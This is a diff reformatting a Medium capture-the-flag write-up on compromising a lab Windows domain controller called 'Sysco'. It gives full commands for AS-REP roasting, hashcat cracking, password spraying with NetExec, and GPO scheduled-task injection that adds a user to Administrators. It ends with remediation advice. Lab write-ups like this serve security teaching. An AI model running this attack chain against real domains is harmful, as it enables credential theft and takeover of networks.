@@ -1,18 +1,10 @@
-# ⚔️ BEYOND THE PERIMETER: Cracking Sysco with Kerberos Exploitation & GPO Task Injection 🛡️💥
+# Sysco
 
-When WinRM fails, persistence wins. See how a simple PuTTY shortcut metadata leak led to the total collapse of a Windows Server 2022 Domain…
-
----
-
-### ⚔️ BEYOND THE PERIMETER: Cracking Sysco with Kerberos Exploitation & GPO Task Injection 🛡️💥
-
-When WinRM fails, persistence wins. See how a simple PuTTY shortcut metadata leak led to the total collapse of a Windows Server 2022 Domain Controller. 🏁👑
+***
 
 ![](https://cdn-images-1.medium.com/max/800/1*_b1NuYPRRV7r3Gn5ciuBSw.png)
 
-**Target:** *Sysco (10.0.21.199)\[HackSmarter\]* **OS:** *Windows* **Difficulty:** *Medium* **Attack Vectors:** *Web Enumeration -\> OSINT/Source Code Analysis -\> AS-REP Roasting -\> Account Takeover*
-
-> <a href="https://medium.com/bugbountywriteup/%EF%B8%8F-beyond-the-perimeter-cracking-sysco-with-kerberos-exploitation-gpo-task-injection-%EF%B8%8F-4530db99feea?sk=06cfbeecbfbb5daac0f6cba6f13eefdb" class="markup--anchor markup--pullquote-anchor" data-href="https://medium.com/bugbountywriteup/%EF%B8%8F-beyond-the-perimeter-cracking-sysco-with-kerberos-exploitation-gpo-task-injection-%EF%B8%8F-4530db99feea?sk=06cfbeecbfbb5daac0f6cba6f13eefdb" target="_blank">**Not a Member?? Click Here to Read Full-Story**</a>
+**Target:** _Sysco (10.0.21.199)\[HackSmarter]_ **OS:** _Windows_ **Difficulty:** _Medium_ **Attack Vectors:** _Web Enumeration -> OSINT/Source Code Analysis -> AS-REP Roasting -> Account Takeover_
 
 ### Executive Summary
 
@@ -24,17 +16,17 @@ The “Sysco” engagement revealed significant lapses in both web application s
 
 **Key Findings**
 
-- <span id="730d">**Non-Standard Service Configuration:** The Domain Controller was hosting a public-facing web server using Apache and PHP instead of the standard IIS, expanding the attack surface.</span>
-- <span id="94f4">**Information Disclosure:** The web application’s source code contained metadata and “Team” section details that leaked valid employee names, directly enabling username enumeration.</span>
-- <span id="7875">**Kerberos Misconfiguration (AS-REP Roasting):** The domain user account “jack.dowland” was configured with “Do not require Kerberos preauthentication,” allowing attackers to request and crack his password hash offline.</span>
+* **Non-Standard Service Configuration:** The Domain Controller was hosting a public-facing web server using Apache and PHP instead of the standard IIS, expanding the attack surface.
+* **Information Disclosure:** The web application’s source code contained metadata and “Team” section details that leaked valid employee names, directly enabling username enumeration.
+* **Kerberos Misconfiguration (AS-REP Roasting):** The domain user account “jack.dowland” was configured with “Do not require Kerberos preauthentication,” allowing attackers to request and crack his password hash offline.
 
-### 1.0 Initial Foothold
+### 1.0 Initial Foothold
 
 #### **1.1 Reconnaissance & Enumeration**
 
 **1.1.1 Nmap Scan**
 
-- <span id="25fb">We began the engagement with a comprehensive port scan to identify the attack surface.</span>
+* We began the engagement with a comprehensive port scan to identify the attack surface.
 
 Command:
 
@@ -70,15 +62,15 @@ ORT     STATE SERVICE       REASON          VERSION
 
 The scan revealed a highly unusual configuration for a Windows Domain Controller.
 
-- <span id="9e45">**Port 80 (HTTP):** The server was running Apache 2.4.58 with PHP 8.2.12. This is a non-standard stack for a Windows DC (which typically runs IIS), suggesting a manual installation like XAMPP.</span>
-- <span id="2896">**Port 445 (SMB):** Confirmed the host is running Windows Server 2022 with SMB signing enabled.</span>
-- <span id="9506">**Port 88 (Kerberos):** Confirmed the host acts as a Domain Controller for the SYSCO.LOCAL domain.</span>
+* **Port 80 (HTTP):** The server was running Apache 2.4.58 with PHP 8.2.12. This is a non-standard stack for a Windows DC (which typically runs IIS), suggesting a manual installation like XAMPP.
+* **Port 445 (SMB):** Confirmed the host is running Windows Server 2022 with SMB signing enabled.
+* **Port 88 (Kerberos):** Confirmed the host acts as a Domain Controller for the SYSCO.LOCAL domain.
 
 #### **1.2 Web Enumeration**
 
 **1.2.1 Directory Discovery**
 
-- <span id="4ef5">Given the anomalies on Port 80, we prioritized web enumeration. We utilized Feroxbuster to brute-force directory names.</span>
+* Given the anomalies on Port 80, we prioritized web enumeration. We utilized Feroxbuster to brute-force directory names.
 
 Command:
 
@@ -194,9 +186,9 @@ by Ben "epi" Risher 🤓                 ver: 2.13.1
 
 The scan uncovered several exposed paths:
 
-- <span id="fb6d">**/forms/:** A directory with listing enabled, exposing contact.php.</span>
-- <span id="4ca1">**/cgi-bin/printenv.pl:** A Perl script that leaked server environment variables, confirming the web root was located at C:/xampp/htdocs.</span>
-- <span id="8451">**/roundcube/:** A login portal for Roundcube Webmail (Version 1.6.11).</span>
+* **/forms/:** A directory with listing enabled, exposing contact.php.
+* **/cgi-bin/printenv.pl:** A Perl script that leaked server environment variables, confirming the web root was located at C:/xampp/htdocs.
+* **/roundcube/:** A login portal for Roundcube Webmail (Version 1.6.11).
 
 ### 2.0 User Enumeration
 
@@ -204,7 +196,7 @@ The scan uncovered several exposed paths:
 
 **2.1.1 The “Team” Leak**
 
-- <span id="030c">With technical enumeration on SMB failing due to access restrictions, we pivoted to analyzing the web content. The “Sysco MSP” website utilized a template that included a “Team” section. By inspecting the HTML source code near the team images, we extracted valid employee names.</span>
+* With technical enumeration on SMB failing due to access restrictions, we pivoted to analyzing the web content. The “Sysco MSP” website utilized a template that included a “Team” section. By inspecting the HTML source code near the team images, we extracted valid employee names.
 
 Command:
 
@@ -214,16 +206,16 @@ curl -s http://dc01.sysco.local/index.html | grep -A 20 "img/team"
 
 **2.1.2 Identified Targets:** This analysis confirmed four valid employees:
 
-- <span id="5310">Greg Shields (System Administrator)</span>
-- <span id="53d6">Sarah Jhonson (Sales Representative)</span>
-- <span id="8622">Jack Dowland (Helpdesk Associate)</span>
-- <span id="e5de">Lainey Moore (System Engineer)</span>
+* Greg Shields (System Administrator)
+* Sarah Jhonson (Sales Representative)
+* Jack Dowland (Helpdesk Associate)
+* Lainey Moore (System Engineer)
 
 From these names, we generated a list of potential usernames (e.g., jack.dowland, greg.shields) for further testing.
 
 ### 3.0 Exploitation
 
-#### **3.1 AS-REP Roasting**
+#### **3.1 AS-REP Roasting**
 
 **3.1.1 The Vulnerability** We utilized the user list generated in the previous step to check for AS-REP Roasting vulnerabilities. This attack targets users who have “Do not require Kerberos preauthentication” enabled, allowing an attacker to request a TGT (Ticket Granting Ticket) without knowing the password.
 
@@ -249,11 +241,11 @@ $krb5asrep$23$jack.dowland@SYSCO.LOCAL:1a5b8595ea805a849dbd8426923e94d2$4173a11d
 
 **3.1.2 The Result**
 
-- <span id="f021">The attack was successful against the user **jack.dowland**. The Domain Controller returned his encrypted Kerberos hash, while other users were secure.</span>
+* The attack was successful against the user **jack.dowland**. The Domain Controller returned his encrypted Kerberos hash, while other users were secure.
 
-#### **3.2 Password Cracking**
+#### **3.2 Password Cracking**
 
-- <span id="9bf4">We took the captured hash offline and utilized Hashcat to crack it against the RockYou wordlist.</span>
+* We took the captured hash offline and utilized Hashcat to crack it against the RockYou wordlist.
 
 Command:
 
@@ -320,81 +312,81 @@ Started: Sat Jan 17 23:52:14 2026
 Stopped: Sat Jan 17 23:52:24 2026
 ```
 
-#### 3.3 Validating Access: The First Pwn
+#### 3.3 Validating Access: The First Pwn
 
 **3.3.1** Before moving laterally, we had to verify these credentials against the Domain Controller using **`NetExec`** (nxc).
 
-- <span id="0a40">**Command**: **`nxc smb 10.0.21.199 -u jack.dowland -p 'mXXXXXXXX1'`**.</span>
-- <span id="e925">**Output**: The green **`[+]`** confirmed valid credentials, though not administrative yet.</span>
+* **Command**: **`nxc smb 10.0.21.199 -u jack.dowland -p 'mXXXXXXXX1'`**.
+* **Output**: The green **`[+]`** confirmed valid credentials, though not administrative yet.
 
 ![](https://cdn-images-1.medium.com/max/800/1*lV7uiqC5y2ZBDWxTdjg7ZA.png)
 
-#### 3.4 Lateral Movement: Roundcube & Cisco Leak
+#### 3.4 Lateral Movement: Roundcube & Cisco Leak
 
 **3.4.1** As a “Helpdesk” employee, Jack had access to internal communications. We leveraged this by logging into the Roundcube webmail portal discovered during enumeration.
 
-- <span id="afd1">**Access Path**: <a href="http://10.1.103.182/roundcube" class="markup--anchor markup--li-anchor" data-href="http://10.1.103.182/roundcube" rel="noopener" target="_blank"><strong><code class="markup--code markup--li-code">http://10.1.103.182/roundcube</code></strong></a></span>
-- <span id="cb23">**Discovery**: An internal email regarding “Router Maintenance” contained a Cisco configuration snippet.</span>
+* **Access Path**: [**`http://10.1.103.182/roundcube`**](http://10.1.103.182/roundcube)
+* **Discovery**: An internal email regarding “Router Maintenance” contained a Cisco configuration snippet.
 
 ![](https://cdn-images-1.medium.com/max/800/1*aHJ1Mm326k6KZyDSF8oLvQ.png)
 
-- <span id="e4c3">**The Vulnerability**: The configuration leaked a Cisco **`Type 5`** enable secret hash.</span>
+* **The Vulnerability**: The configuration leaked a Cisco **`Type 5`** enable secret hash.
 
 ![](https://cdn-images-1.medium.com/max/800/1*QOCYWmBgYg6ALOZtChhdQA.png)
 
 **3.4.2** We took the Cisco hash offline to crack the secondary password.
 
-- <span id="fbd9">**Command**: **`hashcat -m 500 cisco_hash.txt /usr/share/wordlists/rockyou.txt`**</span>
-- <span id="389f">**Result**: **`CXXXXXXX1`**</span>
+* **Command**: **`hashcat -m 500 cisco_hash.txt /usr/share/wordlists/rockyou.txt`**
+* **Result**: **`CXXXXXXX1`**
 
-#### 3.5 Credential Stuffing & RDP Access
+#### 3.5 Credential Stuffing & RDP Access
 
 **3.5.1** Following the principle of password reuse, we tested `CXXXXXXX1` against our remaining user list.
 
-- <span id="d8fc">**Command**: **`nxc smb 10.0.21.199 -u users.txt -p 'CXXXXXXX1'`**</span>
-- <span id="92c8">**The Match**: The account **`lainey.moore`** successfully authenticated with this password.</span>
+* **Command**: **`nxc smb 10.0.21.199 -u users.txt -p 'CXXXXXXX1'`**
+* **The Match**: The account **`lainey.moore`** successfully authenticated with this password.
 
 ![](https://cdn-images-1.medium.com/max/800/1*hYx5Nt2EkgZDCdl_YIVIpA.png)
 
 **3.5.2** While **`evil-winrm`** was unresponsive, we confirmed that the "Remote Desktop Users" group membership allowed for a GUI session.
 
-- <span id="d523">**Command**: **`xfreerdp3 /v:10.0.21.199 /u:lainey.moore /p:CXXXXXXX1 /cert:ignore /dynamic-resolution +clipboard`**</span>
+* **Command**: **`xfreerdp3 /v:10.0.21.199 /u:lainey.moore /p:CXXXXXXX1 /cert:ignore /dynamic-resolution +clipboard`**
 
-#### 3.6 Initial Objective: User Flag
+#### 3.6 Initial Objective: User Flag
 
 **3.6.1** Once the RDP session was established as **`lainey.moore`**, we prioritized the retrieval of the user flag to confirm local access.
 
-- <span id="0249">**Location**: The flag was located on the user’s desktop as expected in standard CTF environments.</span>
-- <span id="b331">**Command**: **`type C:\Users\lainey.moore\Desktop\user.txt`**</span>
-- <span id="7c35">**Flag**:</span>
+* **Location**: The flag was located on the user’s desktop as expected in standard CTF environments.
+* **Command**: **`type C:\Users\lainey.moore\Desktop\user.txt`**
+* **Flag**:
 
 ![](https://cdn-images-1.medium.com/max/800/1*R5hCTce2t2Yq_8utkObPKw.png)
 
-### 4.0 Escalation: The PuTTY Metadata Leak
+### 4.0 Escalation: The PuTTY Metadata Leak
 
 **4.0.1** Inside the RDP session, we performed local enumeration on Lainey’s **`Documents`** folder and discovered a PuTTY shortcut file (**`.lnk`**).
 
 **4.0.2** We analyzed the shortcut’s metadata to reveal the execution arguments.
 
-- <span id="9744">**Command**: **`type "Putty - HS Router Login.lnk"`**</span>
-- <span id="5555">**The Critical Leak**: The administrator had hardcoded the login command with a plain-text password.</span>
-- <span id="ceee">**Credentials Found**: **`greg.shields`** : **`5XXXXXXXXXXXXXXX!`**</span>
+* **Command**: **`type "Putty - HS Router Login.lnk"`**
+* **The Critical Leak**: The administrator had hardcoded the login command with a plain-text password.
+* **Credentials Found**: **`greg.shields`** : **`5XXXXXXXXXXXXXXX!`**
 
 **4.0.3** To verify these new credentials, we attempted to elevate our current session. When prompted by User Account Control (UAC), we successfully authenticated using the recovered credentials for **`greg.shields`**.
 
-### 5.0 Domain Admin: GPO Abuse
+### 5.0 Domain Admin: GPO Abuse
 
 **5.0.1** With credentials for the System Administrator, **greg.shields**, we aimed for total domain compromise. Due to network instability affecting remote services, we utilized **GPO Abuse** to escalate our privileges.
 
 **5.0.2** We used **`pyGPOAbuse.py`** to inject an immediate scheduled task into the **Default Domain Policy**.
 
-- <span id="c054">**Command**: **`python3 pygpoabuse.py 'SYSCO.LOCAL'/'greg.shields':'5XXXXXXXXXXXXXXXXX!' -dc-ip 10.0.21.199 -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net localgroup Administrators greg.shields /add' -taskname "PrivEsc"`**.</span>
+* **Command**: **`python3 pygpoabuse.py 'SYSCO.LOCAL'/'greg.shields':'5XXXXXXXXXXXXXXXXX!' -dc-ip 10.0.21.199 -gpo-id '31B2F340-016D-11D2-945F-00C04FB984F9' -command 'net localgroup Administrators greg.shields /add' -taskname "PrivEsc"`**.
 
 ![](https://cdn-images-1.medium.com/max/800/1*OTGIAixP6tJIR6OFGleZfw.png)
 
 **5.0.3** We triggered the attack by forcing a Group Policy update within our active RDP session.
 
-- <span id="32be">**Command**: **`gpupdate /force`**.</span>
+* **Command**: **`gpupdate /force`**.
 
 ![](https://cdn-images-1.medium.com/max/800/1*jEApzjNBGCpVUYlXzyEWjQ.png)
 
@@ -402,70 +394,70 @@ Stopped: Sat Jan 17 23:52:24 2026
 
 ![](https://cdn-images-1.medium.com/max/800/1*pcZW8OgPv6Sk4Hi1GBeR5w.png)
 
-- <span id="c4eb">**Command**: **`nxc smb 10.0.21.199 -u greg.shields -p '5XXXXXXXXXXXXXXXXXXX'`**.</span>
-- <span id="b9b3">**Result**: The coveted **`(Pwn3d!)`** status was achieved.</span>
+* **Command**: **`nxc smb 10.0.21.199 -u greg.shields -p '5XXXXXXXXXXXXXXXXXXX'`**.
+* **Result**: The coveted **`(Pwn3d!)`** status was achieved.
 
 ![](https://cdn-images-1.medium.com/max/800/1*jI1tNbAkb6ZnYDJFeE17kA.png)
 
-### 6.0 Final Compromise (Root Flag)
+### 6.0 Final Compromise (Root Flag)
 
 **6.0.1** Because we were working within an RDP session, we utilized the PS to spawn an elevated shell as Greg Shields.
 
-- <span id="49aa">**Right-Click** run as Administrator, type in username & password</span>
-- <span id="fb1c">**Elevation**: After providing the recovered password, we successfully accessed the Administrator’s desktop.</span>
-- <span id="a218">**Root Flag**: **`type C:\Users\Administrator\Desktop\root.txt`**.</span>
+* **Right-Click** run as Administrator, type in username & password
+* **Elevation**: After providing the recovered password, we successfully accessed the Administrator’s desktop.
+* **Root Flag**: **`type C:\Users\Administrator\Desktop\root.txt`**.
 
 ![](https://cdn-images-1.medium.com/max/800/1*vpdonBRDPa4LbX_urO8png.png)
 
 ![](https://cdn-images-1.medium.com/max/800/1*YKyUR8ayOKGIUYgJHSj76A.png)
 
-### 7.0 Red Team Mandate:
+### 7.0 Red Team Mandate:
 
 **7.1 Strategic Analysis** The compromise of the Sysco Domain Controller highlights the critical danger of “Service Creep”. By installing a non-standard Apache/PHP stack directly on the DC, the organization effectively bypassed the hardened security posture typical of a Windows environment, creating a roadmap for attackers via information disclosure and source code analysis.
 
 **7.2 Tactical Failures**
 
-- <span id="83e3">**The Metadata Trail**: Valid employee names were harvested directly from the web application’s “Team” section, eliminating the need for noisy brute-force enumeration.</span>
-- <span id="0990">**Kerberos Negligence**: Leaving AS-REP Roasting enabled for **`jack.dowland`** allowed for an offline attack that bypassed all network-based monitoring.</span>
-- <span id="72ef">**Credential Hygiene**: The reuse of a Cisco enable secret for a system engineer’s domain account facilitated lateral movement.</span>
-- <span id="2a35">**Administrative Sloppiness**: Storing a plain-text password within a PuTTY shortcut metadata provided the final “Keys to the Kingdom”.</span>
+* **The Metadata Trail**: Valid employee names were harvested directly from the web application’s “Team” section, eliminating the need for noisy brute-force enumeration.
+* **Kerberos Negligence**: Leaving AS-REP Roasting enabled for **`jack.dowland`** allowed for an offline attack that bypassed all network-based monitoring.
+* **Credential Hygiene**: The reuse of a Cisco enable secret for a system engineer’s domain account facilitated lateral movement.
+* **Administrative Sloppiness**: Storing a plain-text password within a PuTTY shortcut metadata provided the final “Keys to the Kingdom”.
 
 ### 8.0 Remediation & Hardening Roadmap
 
-- <span id="f43e">**Decommission Non-Standard DC Services** Immediately remove the Apache/PHP (XAMPP) stack from the Domain Controller. All web hosting should be migrated to a segmented, non-privileged member server to reduce the attack surface of the core identity provider.</span>
-- <span id="7254">**Disable AS-REP Roasting Vulnerabilities** Audit all Active Directory accounts and ensure the attribute “Do not require Kerberos preauthentication” is disabled. This forces the KDC to require a timestamp encrypted with the user’s password, preventing attackers from requesting a crackable TGT offline.</span>
-- <span id="5f0d">**Sanitize Public-Facing Information** Scrub all internal employee names, technical metadata, and environment details from public-facing web templates and directory listings. Information disclosure is the primary driver for successful initial reconnaissance.</span>
-- <span id="1a7e">**Eliminate Cleartext Credential Storage** Enforce a strict policy against storing passwords in command-line arguments, scripts, or shortcut metadata. Utilize a secure Password Vaulting solution for administrative credentials and implement Group Policy Objects (GPOs) to restrict where these shortcuts can be created.</span>
-- <span id="d641">**Harden Group Policy Object Permissions** Audit the “Write” and “Apply” permissions on the Default Domain Policy and other sensitive GPOs. Ensure that only a strictly limited and audited “Domain Admins” group has the authority to modify these policies to prevent unauthorized task injection.</span>
+* **Decommission Non-Standard DC Services** Immediately remove the Apache/PHP (XAMPP) stack from the Domain Controller. All web hosting should be migrated to a segmented, non-privileged member server to reduce the attack surface of the core identity provider.
+* **Disable AS-REP Roasting Vulnerabilities** Audit all Active Directory accounts and ensure the attribute “Do not require Kerberos preauthentication” is disabled. This forces the KDC to require a timestamp encrypted with the user’s password, preventing attackers from requesting a crackable TGT offline.
+* **Sanitize Public-Facing Information** Scrub all internal employee names, technical metadata, and environment details from public-facing web templates and directory listings. Information disclosure is the primary driver for successful initial reconnaissance.
+* **Eliminate Cleartext Credential Storage** Enforce a strict policy against storing passwords in command-line arguments, scripts, or shortcut metadata. Utilize a secure Password Vaulting solution for administrative credentials and implement Group Policy Objects (GPOs) to restrict where these shortcuts can be created.
+* **Harden Group Policy Object Permissions** Audit the “Write” and “Apply” permissions on the Default Domain Policy and other sensitive GPOs. Ensure that only a strictly limited and audited “Domain Admins” group has the authority to modify these policies to prevent unauthorized task injection.
 
 ### 📜 Spiritual Perspective: The Hidden Foundation
 
-**Bible Verse**: *Luke 12:2 (KJV)*
+**Bible Verse**: _Luke 12:2 (KJV)_
 
-> *“For there is nothing covered, that shall not be revealed; neither hid, that shall not be known.”*
+> _“For there is nothing covered, that shall not be revealed; neither hid, that shall not be known.”_
 
 **The Tie-In to Cyber & Technology:** In the world of technology, we often operate under the illusion that obscurity equals security. We hide passwords in binary files, we bury misconfigurations in complex GPO trees, and we assume our “hidden” web server stack is safe. But as this engagement proves, every hidden flaw is eventually brought to light by a persistent actor.
 
 True security — like true faith — is not about what you can hide from others, but about the integrity of the foundation when it is tested. Just as a single hidden sin can compromise a life, a single hidden password in a shortcut file can compromise an entire Domain. We must secure our systems not by covering our tracks, but by building them so correctly that even when they are “revealed,” they remain standing.
 
-### 🚀 Join the Mission
+### 🚀 Join the Mission
 
 I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.
 
-- <span id="b582">Is there a specific tool you wish existed?</span>
-- <span id="389e">Is there a hacking concept you want me to learn and explain?</span>
-- <span id="b9f5">Do you have a “brick wall” you’re hitting in your own research?</span>
+* Is there a specific tool you wish existed?
+* Is there a hacking concept you want me to learn and explain?
+* Do you have a “brick wall” you’re hitting in your own research?
 
 Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.
 
-<a href="https://discord.gg/FjWpMW9SUX" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/FjWpMW9SUX" title="https://discord.gg/FjWpMW9SUX"><strong>Join the Iron-Breach Discord Server!</strong><br />
-<em>Welcome to Iron Breach. A community where iron sharpens iron. Join us for ethical hacking, CTF challenges, and…</em>discord.gg</a><a href="https://discord.gg/FjWpMW9SUX" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="fd4a28d0f7710c400275a7d63c666614"></a>
+[**Join the Iron-Breach Discord Server!**\
+_&#x57;elcome to Iron Breach. A community where iron sharpens iron. Join us for ethical hacking, CTF challenges, and…_&#x64;iscord.gg](https://discord.gg/FjWpMW9SUX)
 
-<a href="https://github.com/R00t3dbyFa17h" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://github.com/R00t3dbyFa17h" title="https://github.com/R00t3dbyFa17h"><strong>R00t3dbyFa17h - Overview</strong><br />
-<em>Offensive Security Researcher &amp; Tool Developer. Here to secure the digital world one endpoint at a time!! …</em>github.com</a><a href="https://github.com/R00t3dbyFa17h" class="js-mixtapeImage mixtapeImage u-ignoreBlock" data-media-id="3ee08a69482310c5660137f9d4af7614" data-thumbnail-img-id="0*HMlwW2UJFf1l2doU" style="background-image: url(https://cdn-images-1.medium.com/fit/c/160/160/0*HMlwW2UJFf1l2doU);"></a>
+[**R00t3dbyFa17h - Overview**\
+_&#x4F;ffensive Security Researcher & Tool Developer. Here to secure the digital world one endpoint at a time!! …_&#x67;ithub.com](https://github.com/R00t3dbyFa17h)
 
-By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [January 25, 2026](https://medium.com/p/4530db99feea).
+By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [January 25, 2026](https://medium.com/p/4530db99feea).
 
-<a href="https://medium.com/@nicholasmullenski/%EF%B8%8F-beyond-the-perimeter-cracking-sysco-with-kerberos-exploitation-gpo-task-injection-%EF%B8%8F-4530db99feea" class="p-canonical">Canonical link</a>
+[Canonical link](https://medium.com/@nicholasmullenski/%EF%B8%8F-beyond-the-perimeter-cracking-sysco-with-kerberos-exploitation-gpo-task-injection-%EF%B8%8F-4530db99feea)
 
 Exported from [Medium](https://medium.com) on September 1, 2026.
